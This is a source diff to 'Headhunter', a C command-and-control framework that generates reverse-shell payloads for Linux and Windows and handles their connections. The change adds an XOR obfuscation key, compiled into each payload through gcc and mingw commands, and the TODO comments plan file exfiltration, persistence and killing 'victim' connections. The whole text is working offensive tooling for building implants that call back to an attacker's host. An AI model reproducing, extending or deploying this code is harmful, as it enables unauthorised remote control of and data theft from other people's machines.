@@ -1,4 +1,4 @@
-// Headhunter - Reverse shell handler and payload generator
+// Headhunter - C2 Framework
 // Author: Logan Goins
 // 
 //
@@ -8,7 +8,6 @@
 // Implement command session command "exfil", which allows you to exfil files.
 // Implement server session command kill, which allows you to kill a connection to a victim machine.
 // Add better error handling on payload, as well as implement persistence methods
-// Implement AES256 encryption between payload and server
 
 
 #include "server.c"
@@ -17,6 +16,12 @@
 #include <ctype.h>
 #include <string.h>
 #include <stdbool.h>
+#include <signal.h>
+#include <sys/wait.h>
+
+// XOR key variable declaration
+char* key;
+int keylen;
 
 // function prototypes
 bool strcmp_alias(char* str1, char* str2_1, char* str2_2);
@@ -25,8 +30,20 @@ void run_server(char* port);
 int generate_payload(char* platform, char* outfile, char* port, char* lhost);
 int parse_payload_generation(int argc, char **argv);
 
-
 int main(int argc, char **argv){
+	
+	// XOR key 
+	key = "NCMzvxra3Lr8T5gPfPa68UYnQre0Hvgg"; // Insert your own random XOR key here
+	keylen = strlen(key);
+
+	// Handle sigints
+	signal(SIGINT, SIG_IGN);
+        wait(NULL);
+        if(signal(SIGINT, int_handler) == SIG_ERR){
+		printf("failed to register interrupts with kernel\n");
+    	}
+
+
 	// loop through argv and search for the command being entered
 	// the first of either -h/--help, -l/--listen, or -g/--generate will be executed
 	// i starts at 1 because argv[0] is always "./headhunter"
@@ -112,13 +129,13 @@ int generate_payload(char* platform, char* outfile, char* port, char* lhost) {
 	// generate different compile commands based on the payload's platform
 	if(strcmp(platform, "linux") == 0)
 		// gcc payload_linux.c -D PORT=port -D LHOST='"lhost"' -o outfile
-		snprintf(cmd, CMD_SIZE, "gcc /usr/lib/headhunter/payload/payload_linux.c -D PORT=%s -D LHOST='\"%s\"' -o %s", port, lhost, outfile);
+		snprintf(cmd, CMD_SIZE, "gcc /usr/lib/headhunter/payload/payload_linux.c -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s", port, lhost, key, outfile);
 	else if(strcmp(platform, "win64") == 0)
 		// x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
-		snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload/payload_windows.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
+		snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload/payload_windows.c -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s -lws2_32", port, lhost, key, outfile);
 	else if(strcmp(platform, "win32") == 0)
 		// i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
-		snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc /usr/lib/headhunter/payload/payload_windows.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
+		snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc /usr/lib/headhunter/payload/payload_windows.c -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s -lws2_32", port, lhost, key, outfile);
 	else{
 		printf("Please enter a valid platform.\n");
 		return 1;
